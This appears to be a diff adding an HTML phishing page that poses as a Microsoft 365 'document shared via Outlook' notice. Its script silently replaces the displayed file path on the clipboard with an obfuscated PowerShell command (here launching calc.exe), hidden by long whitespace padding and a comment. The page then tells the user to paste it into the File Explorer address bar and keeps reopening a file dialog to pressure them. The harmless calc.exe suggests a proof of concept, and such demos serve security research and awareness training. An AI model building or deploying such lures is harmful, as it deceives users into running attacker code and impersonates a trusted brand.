@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Microsoft 365 - Document Shared</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", sans-serif;
+      background-color: #f3f2f1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .card {
+      width: 480px;
+      background: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.08);
+      padding: 32px 28px;
+      border: 1px solid #e1e1e1;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+
+    .header img {
+      width: 28px;
+      margin-right: 12px;
+    }
+
+    .header h1 {
+      font-size: 18px;
+      font-weight: 500;
+      color: #2f2f2f;
+      margin: 0;
+    }
+
+    .description {
+      font-size: 14.5px;
+      color: #4b4b4b;
+      margin-bottom: 20px;
+    }
+
+    ol {
+      padding-left: 20px;
+      color: #333;
+      font-size: 14px;
+    }
+
+    .code-block {
+      background-color: #f3f3f3;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-family: Consolas, monospace;
+      font-size: 13px;
+      padding: 10px 14px;
+      margin: 8px 0 16px;
+      position: relative;
+      cursor: pointer;
+      user-select: all;
+    }
+
+    .code-block:hover {
+      background-color: #e8e8e8;
+    }
+
+    .code-block::after {
+      content: "Click to copy";
+      font-size: 11px;
+      color: #0078d4;
+      position: absolute;
+      top: 50%;
+      right: 14px;
+      transform: translateY(-50%);
+      opacity: 0.7;
+    }
+
+    .code-block.clicked::after {
+      content: "Copied";
+      color: #0b9444;
+    }
+
+    button {
+      background-color: #0078d4;
+      color: white;
+      font-size: 14px;
+      padding: 10px 24px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 16px;
+    }
+
+    button:hover {
+      background-color: #005fa3;
+    }
+
+    input[type="file"] {
+      display: none;
+    }
+
+    .footer {
+      font-size: 11px;
+      color: #777;
+      text-align: center;
+      margin-top: 24px;
+      border-top: 1px solid #ddd;
+      padding-top: 12px;
+    }
+
+    .footer img {
+      height: 16px;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+      <h1>Document shared with you via Outlook</h1>
+    </div>
+
+    <div class="description">
+      A document titled <strong>“PolicyProtection_2025.docx”</strong> was shared with you. Follow the steps below to open it in your local environment:
+    </div>
+
+    <ol>
+      <li>Click "Open Folder" below to launch File Explorer</li>
+      <li>Press <kbd>Ctrl</kbd> + <kbd>L</kbd> to focus the address bar</li>
+      <li>Paste the path and press <strong>Enter</strong></li>
+    </ol>
+
+    <div class="code-block" id="clipboard">
+      C:\Documents\Shared\PolicyProtection_2025.docx
+    </div>
+
+    <button id="openBtn">Open Folder</button>
+    <input type="file" id="fileInput" />
+
+    <div class="footer">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft"> Microsoft Corporation · Confidential
+    </div>
+  </div>
+
+  <script>
+    const clipboard = document.getElementById("clipboard");
+    const openBtn = document.getElementById("openBtn");
+    const fileInput = document.getElementById("fileInput");
+
+    const command = ["p", "o", "w", "e", "r", "s", "h", "e", "l", "l"].join('');
+    const flag = "-c";
+    const exe = "calc.exe";
+    const visible = "# C:\\Documents\\Shared\\PolicyProtection_2025.docx";
+    const payload = ${command} ${flag} ${exe} + "                                                                                                                " + visible + "                                                                                            ";
+
+    function copyPayload() {
+      navigator.clipboard.writeText(payload).then(() => {
+        clipboard.classList.add("clicked");
+      });
+    }
+
+    clipboard.addEventListener("click", copyPayload);
+    openBtn.addEventListener("click", () => {
+      copyPayload();
+      fileInput.click();
+    });
+
+    fileInput.addEventListener("change", () => {
+      alert("Please follow the instructions to access the document.");
+      fileInput.value = "";
+      setTimeout(() => fileInput.click(), 500);
+    });
+  </script>
+</body>
+</html>
+
